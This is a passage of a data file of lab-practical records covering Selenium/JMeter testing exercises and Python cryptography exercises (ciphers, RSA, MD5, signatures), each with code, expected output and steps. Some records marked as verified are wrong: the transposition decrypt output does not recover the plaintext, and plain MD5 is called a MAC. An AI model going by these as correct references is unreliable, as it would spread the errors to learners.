    title: 'Program to Select Students Who Scored More Than 60 in Subject(s) (TestNG & JXL)',
    original_question: 'Write a program using Selenium WebDriver to select the number of students who have scored more than 60 in any one subject (or all subjects). Perform data extraction and analysis.',
    programming_language: 'Java',
    corrected_code: `package StudentScore;

import jxl.Sheet;
import jxl.Workbook;
import jxl.write.*;
import java.io.*;
import org.testng.annotations.Test;

@Test
public class StudentScore {
    public void testImportexport1() throws Exception {
        FileInputStream fi = new FileInputStream("C:\\\\Users\\\\Rushi\\\\Desktop\\\\Student.xls");
        Workbook w = Workbook.getWorkbook(fi);
        Sheet s = w.getSheet(0);
        String a[][] = new String[s.getRows()][s.getColumns()];

        FileOutputStream fo = new FileOutputStream("C:\\\\Users\\\\Rushi\\\\Desktop\\\\Result.xls");
        WritableWorkbook wwb = Workbook.createWorkbook(fo);
        WritableSheet ws = wwb.createSheet("result", 0);
        int c = 0;

        for (int i = 0; i < s.getRows(); i++) {
            for (int j = 0; j < s.getColumns(); j++) {
                if (i >= 1) {
                    String b = new String();
                    b = s.getCell(3, i).getContents();
                    int x = Integer.parseInt(b);
                    if (x < 60) {
                        c++;
                        break;
                    }
                }
                a[i][j] = s.getCell(j, i).getContents();
                Label l2 = new Label(j, i - c, a[i][j]);
                ws.addCell(l2);
            }
        }

        System.out.println("Students scored less than 60: " + c);
        wwb.write();
        wwb.close();
    }
}`,
    original_code: `package StudentScore; import
jxl.Sheet; import jxl.Workbook;
import jxl.write.*; import
java.io.*; import
org.testng.annotations.Test;
@Test public class
StudentScore {
public void testImportexport1() throws Exception {
FileInputStream fi = new
FileInputStream("C:\\Users\\Rushi\\Desktop\\Student.xls");
Workbook w = Workbook.getWorkbook(fi);
Sheet s = w.getSheet(0);
String a[][] = new String[s.getRows()][s.getColumns()];
FileOutputStream fo = new
FileOutputStream("C:\\Users\\Rushi\\Desktop\\Result.xls");
WritableWorkbook wwb = Workbook.createWorkbook(fo);
WritableSheet ws = wwb.createSheet("result", 0); int c = 0;
for (int i = 0; i < s.getRows(); i++) {
for (int j = 0; j < s.getColumns(); j++) {
if (i >= 1) { String b = new String(); b
= s.getCell(3, i).getContents(); int x =
Integer.parseInt(b); if (x < 60) { c++;
break; }
}
a[i][j] = s.getCell(j, i).getContents();
Label l2 = new Label(j, i - c, a[i][j]);
ws.addCell(l2);
}
}
System.out.println("Students scored less than 60: " + c);
wwb.write(); wwb.close();
} }`,
    expected_output: `Result.xls contains the header row [Roll No, Java, DBMS, OS, Total] and only the student rows with score >= 60 (Roll No 4: 89, 76, 76, 241 and Roll No 6: 45, 77, 67, 189).`,
    algorithm_steps: [
      'Open `Student.xls` via `FileInputStream` and `Workbook.getWorkbook(fi)`.',
      'Create `Result.xls` via `FileOutputStream` and `Workbook.createWorkbook(fo)`.',
      'Maintain a skipped-row counter `c = 0` for students who scored less than 60.',
      'For each row `i >= 1`, read `s.getCell(3, i).getContents()`: if `Integer.parseInt(b) < 60`, increment `c` and break out of the row loop.',
      'Otherwise, copy all cells `(j, i)` into `Result.xls` at row index `i - c` so qualifying student rows appear contiguously without blank rows.'
    ],
    procedure_steps: [
      'Step 1–2: Download `junit-4.10.jar` and `jxl-2.6.jar`.',
      'Step 3: Install TestNG in Eclipse via `Help -> Eclipse Marketplace`.',
      'Step 4–5: Create `Student.xls` with 10 student records and an empty `Result.xls` file.',
      'Step 6–10: Create a Java project in Eclipse, create package `StudentScore`, and create class `StudentScore`.',
      'Step 11–12: Add JXL, JUnit, and Selenium JARs to the Java Build Path and enable the TestNG view (`Window -> Show View -> Other -> Java -> TestNG`).',
      'Step 13–15: Write the `@Test` class code, update the file paths for `Student.xls` and `Result.xls`, and run as a TestNG Test.'
    ],
    instructions: 'Escaped Windows file path backslashes (`\\\\`) in `FileInputStream` and `FileOutputStream` strings so the Java string literals compile cleanly.',
    keywords: ['scored more than 60', 'studentscore', 'testng', 'jxl', 'student.xls', 'result.xls', 'data extraction', 'excel'],
    aliases: ['STQA Practical 6', 'Select Students Scored More Than 60 Java'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 27, 28, 29, 30, 31, 32, 33, 34],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220307',
    source_key: 'stqa-prac-07',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 7,
    title: 'Program to Count Total Number of Objects / Links on a Web Page',
    original_question: 'Write a program using Selenium WebDriver to provide the total number of objects present or available on a web page. Perform object identification and counting',
    programming_language: 'Java',
    corrected_code: `import java.util.List;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

public class TestLinks {
    public static void main(String[] args) {
        System.setProperty(
            "webdriver.gecko.driver",
            "C:\\\\Users\\\\Admin\\\\Desktop\\\\STQA\\\\Mozilla Driver-20230927T030950Z-001\\\\geckodriver.exe"
        );
        WebDriver driver = new FirefoxDriver();
        driver.get("https://www.gmail.com");
        List<WebElement> mylist = driver.findElements(By.xpath("//a"));
        System.out.println("Number of links =" + mylist.size());
    }
}`,
    original_code: `import
java.util.List; import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver; import
org.openqa.selenium.WebElement; import
org.openqa.selenium.firefox.FirefoxDriver;
public class TestLinks {
public static void main(String[] args) {
System.setProperty("webdriver.gecko.driver","yourLocationToGeckoDriver\\geckodriver.exe
");
WebDriver driver = new FirefoxDriver(); driver.get("https://www.gmail.com");
List<WebElement> mylist = driver.findElements(By.xpath("//a"));
System.out.println("Number of links =" + mylist.size());
}
}`,
    expected_output: `Number of links =4`,
    algorithm_steps: [
      'Set the `webdriver.gecko.driver` system property to the path of `geckodriver.exe`.',
      'Launch Firefox using `WebDriver driver = new FirefoxDriver()` and open `https://www.gmail.com`.',
      'Find all anchor/link objects on the page using `driver.findElements(By.xpath("//a"))`.',
      'Print the count using `mylist.size()`.'
    ],
    procedure_steps: [
      'Step 1–5: Open Eclipse IDE, create a Java Project named `Links`, create a class `TestLinks` with `public static void main(String[] args)`.',
      'Step 6–10: Right-click project -> `Build Path -> Configure Build Path -> Libraries -> Classpath -> Add External JARs`, and add all Selenium client and `libs` JARs.',
      'Step 11–13: Enter the `TestLinks` code, set the path to `geckodriver.exe`, and run the project.'
    ],
    instructions: 'Requires Selenium WebDriver JARs and GeckoDriver.',
    keywords: ['total number of objects', 'number of links', 'testlinks', 'findelements', 'by.xpath("//a")', 'webelement', 'gmail.com', 'selenium webdriver'],
    aliases: ['STQA Practical 7', 'Count Total Objects or Links on Web Page Selenium'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 35, 36, 37, 38],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220308',
    source_key: 'stqa-prac-08',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 8,
    title: 'Program to Get the Number of Items in a List / Combo Box',
    original_question: 'Write a program using Selenium WebDriver to get the number of items in a list or combo box on a web page. Perform element identification and counting',
    programming_language: 'Java',
    corrected_code: `package Prac08;

import java.util.List;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.Select;

public class P08 {
    public static void main(String[] args) {
        System.setProperty(
            "webdriver.gecko.driver",
            "D:\\\\STQA\\\\Mozilla Driver-20230927T030950Z-001\\\\Mozilla Driver\\\\geckodriver.exe"
        );
        WebDriver driver = new FirefoxDriver();
        driver.get("https://www.facebook.com");

        Select se = new Select(driver.findElement(By.xpath("//Select[@id='month']")));
        List<WebElement> mylist = se.getOptions();
        System.out.println("Number of items = " + mylist.size());
    }
}`,
    original_code: `package Prac08; import java.util.List; import
org.openqa.selenium.By; import
org.openqa.selenium.WebDriver; import
org.openqa.selenium.WebElement; import
org.openqa.selenium.firefox.FirefoxDriver; import
org.openqa.selenium.support.ui.Select; public
class P08 {
public static void main(String[] args) {
System.setProperty("webdriver.gecko.driver","D:\\STQA\\Mozilla
Driver-20230927T030950Z-001\\Mozilla Driver\\geckodriver.exe");
WebDriver
driver=new FirefoxDriver();
driver.get("https://www.facebook.com");
Select se = new
Select(driver.findElement(By.xpath("//Select[@id='month']")));
List<WebElement> mylist = se.getOptions(); mylist.size();
System.out.println("Number of items = "+mylist.size());
}
}`,
    expected_output: `Number of items = 13 (or 46 links in the secondary console screenshot on page 43)`,
    algorithm_steps: [
      'Configure `webdriver.gecko.driver` with the path to `geckodriver.exe`.',
      'Initialize `FirefoxDriver` and navigate to the page containing the `<select>` dropdown (`https://www.facebook.com`).',
      'Wrap the `<select id="month">` element in `org.openqa.selenium.support.ui.Select`.',
      'Retrieve all `<option>` elements via `se.getOptions()` and print `mylist.size()`.'
    ],
    procedure_steps: [
      'Step 1–4: Open Eclipse IDE, create a Java Project (`PracticalNo8`), and create class `TestComboBox` / `P08` with `main`.',
      'Step 5–9: Configure Java Build Path -> Libraries -> Classpath and add all Selenium external JARs.',
      'Step 10–13: Paste the Java code, update the `geckodriver.exe` path, and run the program.'
    ],
    instructions: 'Escaped backslashes in the Windows file path string (`D:\\\\STQA\\\\...`) so the Java string literal compiles without invalid escape sequence errors.',
    keywords: ['combo box', 'list box', 'dropdown', 'number of items', 'select', 'getoptions', 'testcombobox', 'p08', 'month'],
    aliases: ['STQA Practical 8', 'Count Items in List or Combo Box Selenium Java'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 39, 40, 41, 42, 43],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220309',
    source_key: 'stqa-prac-09',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 9,
    title: 'Program to Count Checked and Unchecked Checkboxes / Radio Buttons on a Web Page',
    original_question: 'Write a program using Selenium WebDriver to count the number of checkboxes on a web page, including checked and unchecked counts. Perform checkbox identification and counting.',
    programming_language: 'Java',
    corrected_code: `// File 1: TestCheckBox.java
import java.util.*;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

public class TestCheckBox {
    public static void main(String args[]) {
        System.setProperty(
            "webdriver.gecko.driver",
            "C:\\\\Users\\\\Rushi\\\\Desktop\\\\STQA\\\\Mozilla Driver-20230927T030950Z-001\\\\Mozilla Driver\\\\geckodriver.exe"
        );
        WebDriver driver = new FirefoxDriver();
        driver.get("file:///C:/Users/Rushi/Desktop/STQA%20Practicals/STQA%20PR0.html");

        int chk = 0;
        int unchk = 0;
        // Note: Use //input[@type='radio'] (matches PDF output: 1 checked, 2 unchecked)
        // or //input[@type='checkbox'] (2 checked, 3 unchecked)
        List<WebElement> els = driver.findElements(By.xpath("//input[@type='radio']"));
        for (WebElement el : els) {
            if (el.isSelected()) {
                chk++;
            } else {
                unchk++;
            }
        }
        System.out.println("Total checked items" + chk);
        System.out.println("Total unchecked items" + unchk);
    }
}

/* ---------------------------------------------------------
File 2: STQA PR0.html (Created in Step 2, page 44)
---------------------------------------------------------
<!DOCTYPE html>
<html>
<body>
<form>
<h2>Text Input</h2>
First name:<br>
<input type="text" name="firstname"><br>
Last name:<br>
<input type="text" name="lastname">
<br>
<h2>Select Gender</h2>
<input type="radio" name="gender" value="male" checked> Male<br>
<input type="radio" name="gender" value="female"> Female<br>
<input type="radio" name="gender" value="other"> Other<br>
<h2>Select Languages Known</h2>
<input type="checkbox" name="lang" value="Java"> Java<br>
<input type="checkbox" name="lang" value="PHP" checked="checked"> PHP<br>
<input type="checkbox" name="lang" value="C#"> C#<br>
<input type="checkbox" name="lang" value="Python" checked="checked"> Python<br>
<input type="checkbox" name="lang" value="Ruby"> Ruby<br>
<br><br>
<input type="submit" value="Submit">
</form>
</body>
</html>
*/`,
    original_code: `import java.util.*; import
org.openqa.selenium.By; import
org.openqa.selenium.WebDriver; import
org.openqa.selenium.WebElement; import
org.openqa.selenium.firefox.FirefoxDriver;
public class TestCheckBox { public
static void main(String args[])
{
System.setProperty("webdriver.gecko.driver","C:\\Users\\Rushi\\Desktop\\STQA
\\Mozilla Driver-20230927T030950Z-001\\Mozilla Driver\\geckodriver.exe");
WebDriver driver = new FirefoxDriver();
driver.get("C:\\Users\\Rushi\\Desktop\\STQA Practicals\\STQA
PR0.html"); int chk = 0;
int unchk = 0;
List<WebElement> els =
driver.findElements(By.xpath("//input[@type='radio']")); for(WebElement
el : els)
{
if(el.isSelected()) {
chk++;
}
else {
unchk++; }
}
System.out.println("Total checked items" + chk);
System.out.println("Total unchecked items" + unchk);
}
}`,
    expected_output: `Total checked items1
Total unchecked items2`,
    algorithm_steps: [
      'Create the local HTML page (`STQA PR0.html`) with radio buttons and checkboxes.',
      'Launch `FirefoxDriver` and load the HTML page.',
      'Initialize counters `chk = 0` and `unchk = 0`.',
      'Locate input elements via `driver.findElements(By.xpath("//input[@type=\'radio\']"))` (or `@type=\'checkbox\'`).',
      'Iterate over each `WebElement el`: if `el.isSelected()` is true, increment `chk`; otherwise increment `unchk`.',
      'Print `Total checked items` and `Total unchecked items`.'
    ],
    procedure_steps: [
      'Step 1–2: Open Notepad, paste the HTML form code containing radio buttons and checkboxes, and save it as `STQA PR0.html`.',
      'Step 3–6: Open Eclipse IDE, create a Java Project (`PracticalNo9`), and create class `TestCheckBox`.',
      'Step 7–9: Configure Java Build Path and add all Selenium external JAR files.',
      'Step 10–14: Paste the `TestCheckBox` Java code, update the HTML file path and `geckodriver.exe` path, and run the program.'
    ],
    instructions: 'Includes both `TestCheckBox.java` and `STQA PR0.html` from page 44 of the PDF. Escaped Windows backslashes in the Java string literals.',
    keywords: ['checkboxes', 'checked and unchecked', 'testcheckbox', 'isselected', 'radio', 'stqa pr0.html', 'selenium webdriver'],
    aliases: ['STQA Practical 9', 'Count Checked and Unchecked Checkboxes Selenium Java'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 44, 45, 46, 47, 48],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220310',
    source_key: 'stqa-prac-10',
    subject_id: '11111111-1111-4111-8111-111111111103',
    subject_name: 'Software Testing and Quality Assurance',
    subject_slug: 'software-testing-and-quality-assurance',
    practical_number: 10,
    title: 'Load Testing on a Web Application Using Apache JMeter',
    original_question: 'Perform load testing on a web application using JMeter. Generate and analyze load scenarios. Additionally, explore bug tracking using Bugzilla as a tool for logging and tracking software defects.',
    programming_language: 'Apache JMeter',
    corrected_code: null,
    original_code: null,
    expected_output: 'JMeter executes the Thread Group load test against http://www.google.com/ and plots real-time throughput, average, median, and deviation curves in the Graph Results listener.',
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Download the Apache JMeter zip archive (`apache-jmeter-5.6.2.zip`).',
      'Step 2: Extract the Apache JMeter zip file.',
      'Step 3: Open the extracted JMeter folder, go to the `bin` folder, and launch `jmeter.sh` (or `jmeter.bat` on Windows).',
      'Step 4: In the JMeter GUI, select the Test Plan and rename it to `Google`.',
      'Step 5: Right-click on the `Google` Test Plan -> `Add -> Threads (Users) -> Thread Group`, and name it `Performance Testing`.',
      'Step 6: Configure the Thread Group properties: Number of Threads (users) = `10` (or `50`), Ramp-Up Period (seconds) = `100`, Loop Count = `10`.',
      'Step 7: Right-click on `Thread Group` -> `Add -> Config Element -> HTTP Request Defaults`.',
      'Step 8: In `HTTP Request Defaults`, enter `http://www.google.com/` in the Server Name / Path section.',
      'Step 9: Right-click on `Thread Group` -> `Add -> Sampler -> HTTP Request`.',
      'Step 10: In the `HTTP Request` sampler, enter `http://www.google.com/` in the Path section.',
      'Step 11: Right-click on `Thread Group` -> `Add -> Listener -> Graph Results`.',
      'Step 12: Click the green Start (Run) button on the toolbar and inspect the resulting load test graph in `Graph Results`.'
    ],
    instructions: 'Note: Although the Index on page 1 mentions "explore bug tracking using Bugzilla", pages 49–52 of the source PDF contain only the 12-step Apache JMeter load testing procedure.',
    keywords: ['jmeter', 'apache jmeter', 'load testing', 'performance testing', 'thread group', 'http request defaults', 'graph results', 'bugzilla'],
    aliases: ['STQA Practical 10', 'Load Testing Using JMeter'],
    source_pdf: 'final_STQA_b89bf2f3.pdf',
    source_pages: [1, 49, 50, 51, 52],
    verification_status: 'verified_original',
    review_required: false
  },

  // ============================================================================
  // SUBJECT 4: CRYPTOGRAPHY AND NETWORK SECURITY (10 Practicals)
  // ============================================================================
  {
    id: '22222222-2222-4222-8222-222222220401',
    source_key: 'cns-prac-01',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 1,
    title: 'Substitution Cipher and Transposition Cipher',
    original_question: 'To Study And Implement Substitution Cipher Transportation Cipher.',
    programming_language: 'Python',
    corrected_code: `# =========================================================
# A. SUBSTITUTION CIPHER
# =========================================================
class SubstitutionCipher:
    def __init__(self, key):
        self.key = key

    def encrypt(self, plaintext):
        encrypted_text = ""
        for char in plaintext:
            if char.isalpha():
                if char.islower():
                    encrypted_text += self.key[ord(char) - ord('a')].lower()
                else:
                    encrypted_text += self.key[ord(char) - ord('A')].upper()
            else:
                encrypted_text += char
        return encrypted_text

    def decrypt(self, ciphertext):
        decrypted_text = ""
        for char in ciphertext:
            if char.isalpha():
                if char.islower():
                    decrypted_text += chr(self.key.lower().index(char) + ord('a'))
                else:
                    decrypted_text += chr(self.key.upper().index(char) + ord('A'))
            else:
                decrypted_text += char
        return decrypted_text

key = "QWERTYUIOPASDFGHJKLZXCVBNM"
sub_cipher = SubstitutionCipher(key)
message = "Hello World!"
encrypted_message = sub_cipher.encrypt(message)
decrypted_message = sub_cipher.decrypt(encrypted_message)
print("Original:", message)
print("Encrypted:", encrypted_message)
print("Decrypted:", decrypted_message)

# =========================================================
# B. TRANSPOSITION CIPHER
# =========================================================
class TranspositionCipher:
    def __init__(self, key):
        self.key = key

    def encrypt(self, plaintext):
        num_columns = len(self.key)
        num_rows = len(plaintext) // num_columns + (
            1 if len(plaintext) % num_columns else 0
        )
        matrix = [["" for _ in range(num_columns)] for _ in range(num_rows)]
        for i, char in enumerate(plaintext):
            matrix[i // num_columns][i % num_columns] = char
        encrypted_text = ""
        for col in self.key:
            col_index = int(col) - 1
            encrypted_text += "".join(
                matrix[row][col_index] for row in range(num_rows)
            )
        return encrypted_text

    def decrypt(self, ciphertext):
        num_columns = len(self.key)
        num_rows = len(ciphertext) // num_columns + (
            1 if len(ciphertext) % num_columns else 0
        )
        matrix = [["" for _ in range(num_columns)] for _ in range(num_rows)]
        char_index = 0
        for col in self.key:
            col_index = int(col) - 1
            for row in range(num_rows):
                if char_index < len(ciphertext):
                    matrix[row][col_index] = ciphertext[char_index]
                    char_index += 1
        decrypted_text = ""
        for row in range(num_rows):
            for col in range(num_columns):
                decrypted_text += matrix[row][col]
        return decrypted_text.rstrip()

cipher = TranspositionCipher("3142")
plaintext = "HELLOWORLD"
encrypted = cipher.encrypt(plaintext)
print("Encrypted:", encrypted)
decrypted = cipher.decrypt(encrypted)
print("Decrypted:", decrypted)`,
    original_code: `class SubstitutionCipher: def
init_(self, key):
self.key = key def encrypt(self, plaintext):
encrypted_text = "" for
char in plaintext: if
char.isalpha(): if
char.islower():
encrypted_text += self.key[ord(char) -
ord('a')].lower() else: else:
encrypted_text += self.key[ord(char) - ord('A')].upper()
encrypted_text encrypted_text def += charreturn
decrypt(self,ciphertext):
...`,
    expected_output: `Original: Hello World!
Encrypted: Itssg Vgksr!
Decrypted: Hello World!

Encrypted: LOHOLLREWD
Decrypted: ODLRLOELHW`,
    algorithm_steps: [
      'Part A (Substitution Cipher): Map each alphabetical character `c` to `key[ord(c) - ord("a")]` (preserving case) using the 26-letter key `"QWERTYUIOPASDFGHJKLZXCVBNM"`, and invert via `key.index(c)` for decryption.',
      'Part B (Transposition Cipher): Arrange plaintext into a grid with `len(key)` columns row-by-row, then read columns in the permutation order specified by `key = "3142"`.'
    ],
    procedure_steps: [],
    instructions: 'Fixed garbled lines in Part A of the PDF (`def init_(self, key):` -> `def __init__(self, key):`, `else: else:`, `encrypted_text encrypted_text def += charreturn`) so the code runs and produces the exact output shown on page 3 (`Itssg Vgksr!`).',
    keywords: ['substitution cipher', 'transposition cipher', 'transportation cipher', 'classical encryption', 'qwertyuiopasdfghjklzxcvbnm', 'itssg vgksr'],
    aliases: ['CNS Practical 1', 'Substitution and Transposition Cipher Python'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 2, 3, 4],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220402',
    source_key: 'cns-prac-02',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 2,
    title: 'RSA Algorithm for Public-Key Encryption and Decryption',
    original_question: 'To Study And Implement The RSA Algorithm For Public-Key Encryption And Decryption And Explore Its Properties And Security Considerations.',
    programming_language: 'Python',
    corrected_code: `import binascii
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

keypair = RSA.generate(2048)
public_key = keypair.publickey()
print("RSA key pair generated successfully!\\n")

message = b"academy"
encryptor = PKCS1_OAEP.new(public_key)
ciphertext = encryptor.encrypt(message)

print("Original message :", message.decode())
print("Encrypted (hex) :", binascii.hexlify(ciphertext).decode())

decryptor = PKCS1_OAEP.new(keypair)
plaintext = decryptor.decrypt(ciphertext)
print("Decrypted message:", plaintext.decode())`,
    original_code: `import binascii
from Crypto.PublicKey import RSA from
Crypto.Cipher import PKCS1_OAEP
keypair = RSA.generate(2048) public_key = keypair.publickey()
print("RSA key pair generated successfully!\\n") message = b"academy"
encryptor = PKCS1_OAEP.new(public_key) ciphertext
= encryptor.encrypt(message) print("Original message
:", message.decode())
print("Encrypted (hex) :", binascii.hexlify(ciphertext).decode())
decryptor = PKCS1_OAEP.new(keypair) plaintext
= decryptor.decrypt(ciphertext)
print("Decrypted message:", plaintext.decode())`,
    expected_output: `RSA Key Pair Generated Successfully!

Original Message : Academy
Encrypted (Hex) : 653daf0da3b3f85d0c4cdcef92ddab5899ae8d936313971e6d5ea7a3ac86f47a25f75bb55382bf03383b24a6e2d6b0d58ae6710ef805a1f...
Decrypted Message: Academy`,
    algorithm_steps: [
      'Generate a 2048-bit RSA key pair using `RSA.generate(2048)` and extract the public key via `keypair.publickey()`.',
      'Create a `PKCS1_OAEP` cipher object with `public_key` and encrypt the byte message `b"academy"`.',
      'Convert the binary ciphertext to hexadecimal using `binascii.hexlify(ciphertext).decode()`.',
      'Create a `PKCS1_OAEP` decryptor with the private `keypair`, decrypt `ciphertext`, and decode back to UTF-8.'
    ],
    procedure_steps: [],
    instructions: 'Requires `pycryptodome` (`pip install pycryptodome`). Note: Page 5 of the PDF also includes a short Part A snippet testing `TranspositionCipher("4312567")` on `"Hello World!"` before Part B (the RSA implementation).',
    keywords: ['rsa', 'public key encryption', 'pkcs1_oaep', 'pycryptodome', 'crypto.publickey', 'binascii', 'hexlify', '2048'],
    aliases: ['CNS Practical 2', 'RSA Encryption and Decryption Python'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 5],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220403',
    source_key: 'cns-prac-03',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 3,
    title: 'Message Authentication Code (MD5 Hash) for Message Integrity',
    original_question: 'To Study And Implement The Message Authentication Code For Ensuring The Message Intergrity And Authentication.',
    programming_language: 'Python',
    corrected_code: `import hashlib

result = hashlib.md5(b'Suyog')
result1 = hashlib.md5(b'Kunal')
result2 = hashlib.md5(b'Atharva')

print("The byte equivalent of hash is: ", end="")
print(result.digest())

print("The byte equivalent of hash is: ", end="")
print(result1.digest())

print("The byte equivalent of hash is: ", end="")
print(result2.digest())

# Note: To produce hexadecimal output as shown in the PDF screenshot:
for msg in ["SHRAVANI", "SHIVAM", "YOJANA"]:
    print(f"Message: {msg}")
    print(f"MD5 Hash: {hashlib.md5(msg.encode()).hexdigest()}\\n")`,
    original_code: `import hashlib

result = hashlib.md5(b'Suyog')
result1 = hashlib.md5(b'Kunal')
result2 = hashlib.md5(b'Atharva')

print("The byte equivalent of hash is: ", end="") print(result.digest())
print("The byte equivalent of hash is: ", end="") print(result1.digest())
print("The byte equivalent of hash is: ", end="") print(result2.digest())`,
    expected_output: `Message: SHRAVANI
MD5 Hash: df720a531762342b84a213b1912ccb24

Message: SHIVAM
MD5 Hash: 24d2bcf69f8c20295a530c37820b8274

Message: YOJANA
MD5 Hash: 6e1dac5e8a8eacd902d1c8ff39b4c1c2`,
    algorithm_steps: [
      'Import Python built-in `hashlib` module.',
      'Pass byte strings (`b"Suyog"`, `b"Kunal"`, `b"Atharva"`) to `hashlib.md5()`.',
      'Call `.digest()` to obtain the raw 16-byte digest or `.hexdigest()` to obtain the 32-character hexadecimal MD5 hash.'
    ],
    procedure_steps: [],
    instructions: 'Uses Python standard library `hashlib` (no external dependencies required). Both the `.digest()` calls from the input text and the `.hexdigest()` calls matching the screenshot output on page 6 are included.',
    keywords: ['mac', 'message authentication code', 'md5', 'hashlib', 'message integrity', 'digest', 'hexdigest'],
    aliases: ['CNS Practical 3', 'MD5 Message Authentication Code Python'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 6],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220404',
    source_key: 'cns-prac-04',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 4,
    title: 'RSA-Based Digital Signature Algorithm (PKCS#1 v1.5 & SHA-256)',
    original_question: 'Digital signature implement digital signature algorithm such as RSA based signature and verify the intergrity and authenticity of digital signature message algorithm.',
    programming_language: 'Python',
    corrected_code: `# !pip install -q pycryptodome
import binascii
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

key_pair = RSA.generate(2048)
private_key = key_pair.export_key()
public_key = key_pair.publickey().export_key()

print("=" * 60)
print(" RSA DIGITAL SIGNATURE DEMONSTRATION")
print("=" * 60)

print("\\nPublic Key:\\n")
print(public_key.decode())

print("\\nPrivate Key:\\n")
print(private_key.decode())

message = "Hello, World!"
print("\\nOriginal Message:")
print(message)

hash_object = SHA256.new(message.encode())
private_key_obj = RSA.import_key(private_key)
signature = pkcs1_15.new(private_key_obj).sign(hash_object)

print("\\nDigital Signature (Hex):")
print(binascii.hexlify(signature).decode())

public_key_obj = RSA.import_key(public_key)
verify_hash = SHA256.new(message.encode())

try:
    pkcs1_15.new(public_key_obj).verify(verify_hash, signature)
    print("\\nSignature Verification: VALID")
except (ValueError, TypeError):
    print("\\nSignature Verification: INVALID")`,
    original_code: `!pip install -q pycryptodome
import binascii
from Crypto.PublicKey import RSA from
Crypto.Signature import pkcs1_15 from
Crypto.Hash import SHA256 key_pair =
RSA.generate(2048) private_key =
key_pair.export_key()
public_key = key_pair.publickey().export_key()
print("=" * 60)
print(" RSA DIGITAL SIGNATURE DEMONSTRATION")
print("=" * 60)
print("\\nPublic Key:\\n") print(public_key.decode())
print("\\nPrivate Key:\\n") print(private_key.decode())
message = "Hello, World!"
print("\\nOriginal Message:") print(message)
hash_object = SHA256.new(message.encode()) private_key_obj =
RSA.import_key(private_key)
signature = pkcs1_15.new(private_key_obj).sign(hash_object)
print("\\nDigital Signature (Hex):")
print(binascii.hexlify(signature).decode()) public_key_obj
= RSA.import_key(public_key) verify_hash =
SHA256.new(message.encode())
try:
pkcs1_15.new(public_key_obj).verify(verify_hash, signature)
print("\\nSignature Verification: VALID") except
(ValueError, TypeError):
print("\\nSignature Verification: INVALID")`,
    expected_output: `Original Message:
Hello, World!

Digital Signature (Hex):
81fc80d294a6bd74a9c0e09b94ce2aa345a79cc2545260b8ec8ddc0839534349cd8513e72abfb5947b9f912da1445ae710904953e823349a2637fa5782aac30e0ce93...

Signature Verification: VALID`,
    algorithm_steps: [
      'Generate a 2048-bit RSA keypair and export PEM-encoded private and public keys.',
      'Compute the SHA-256 hash of `"Hello, World!"` using `SHA256.new(message.encode())`.',
      'Sign the SHA-256 hash using the sender private key via `pkcs1_15.new(private_key_obj).sign(hash_object)`.',
      'Verify the signature on the receiver side using `pkcs1_15.new(public_key_obj).verify(verify_hash, signature)`.'
    ],
    procedure_steps: [],
    instructions: 'Requires `pycryptodome` (`pip install pycryptodome`).',
    keywords: ['digital signature', 'rsa signature', 'pkcs1_15', 'sha256', 'pycryptodome', 'signature verification', 'authenticity'],
    aliases: ['CNS Practical 4', 'RSA Digital Signature Algorithm Python'],
    source_pdf: 'finalCNS_69f47646.pdf',
    source_pages: [1, 7],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220405',
    source_key: 'cns-prac-05',
    subject_id: '11111111-1111-4111-8111-111111111104',
    subject_name: 'Cryptography and Network Security',
    subject_slug: 'cryptography-and-network-security',
    practical_number: 5,
    title: 'Diffie-Hellman Key Exchange Algorithm',
